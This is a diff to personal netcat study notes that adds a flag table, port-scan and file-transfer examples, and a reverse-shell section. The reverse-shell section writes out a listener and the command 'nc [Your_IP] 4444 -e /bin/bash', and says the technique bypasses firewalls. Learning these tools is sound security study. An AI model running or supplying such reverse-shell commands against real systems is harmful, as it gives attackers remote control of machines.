@@ -5,10 +5,20 @@
     >> transferring files
     >> acting as a simple server or client
 
+Flag |   Name      | Usage
+-----|-------------|-------------------------------------------------------------------------
+-l   |   Listen    |  Used to create a server/listener.
+-v   |   Verbose   |  Shows detailed info (highly recommended).
+-p   |   Port      |  Specifies the port number.
+-u   |   UDP       |  Switches from TCP (default) to UDP mode.
+-n   |   Numeric   |  Stops NC from trying to resolve hostnames via DNS (makes it faster).
+-w   |   Timeout   |  Stops the connection after X seconds of inactivity.
+-k   |   Keep-Open | Keeps the listener alive even after a client disconnects.
                 
                     COMMON USES     
                 ==================      
-- When conducting reverse shell attacks we do not connect to a machine we wait for the machine to connect to us. To do this we need to create a listener to listen for a connection to our machine on a certain port that we are going to specify.
+- When conducting reverse shell attacks we do not connect to a machine we wait for the machine to connect to us.
+- To do this we need to create a listener to listen for a connection to our machine on a certain port that we are going to specify.
 	EG.
 		nc -lnvp 87  -->  nc -lnvp <port number>
 
@@ -35,36 +45,39 @@
     EG. [[tcp connection]]
         nc -zv hostname start_port-end_port ----> nc -zv example.com 80-100
 
+            -z : tells netcat to report a connection status without sending any actual data.
+
     EG. [[udp connections]]
         nc -zvu hostname start_port-end_port ----> nc -zvu example.com 80-100
 
 
-- Transferring files from sender to reciever.
-    EG. [[Sender]]
-        nc -l -p port < filename 
+- Transferring files between sender and reciever.
+    EG. 
+        nc -l -p port < sending_file
 
             EG.<<transferring file.txt on port 12345>>
                 nc -l -p 12345 < file.txt
 
-    EG. [[Receiver]]
-        nc hostname port > filename
+            OR 
+        
+        nc -lvp port > recieved_file.txt 
+            
+            EG. << recieving file.txt on port 12345>>
+                nc -l -p 12345 > file.txt 
+
+
+    EG. 
+        nc hostname port > recieving_file
 
             EG.<<receive file.txt from hostname on port 12345>>
                 nc localhost 12345 > file1.txt
 
+            OR 
 
-- Transferring files from reciever to sender.
-    EG. [[Sender]]
-        nc -l -p port > filename 
+        nc hostname port < sending_file
 
-            EG.<<transferring file.txt on port 12345>>
-                nc -l -p 12345 > file.txt
-
-    EG. [[Receiver]]
-        nc hostname port < filename
-
-            EG.<<receive file.txt from hostname on port 12345>>
-                nc localhost 12345 < file1.txt
+            EG. << sending file.txt from hostname on port 12345>>
+                nc localhost 12345 < file.txt
 
 
 - connect to a remote server and send data
@@ -76,6 +89,8 @@
     EG.
         nc -w 5 example.com 12345
 
+            - waits 5 seconds for a timeout.
+
 
 - execute a command 
     EG.
@@ -85,3 +100,17 @@
 - Running netcat in the background:
     EG.
         nc -l -p 12345 &
+
+
+- executing shells.
+    - Reverse shell (the target connects to YOU)
+        > This is more common because it bypasses most firewalls (which usually block incoming connections but allows outgoing ones).
+            EG.
+                # Your machine (Listening)
+                nc -lvp 4444
+
+                # Target machine (Connecting back to you)
+                nc [Your_IP] 4444 -e /bin/bash
+
+
+- 
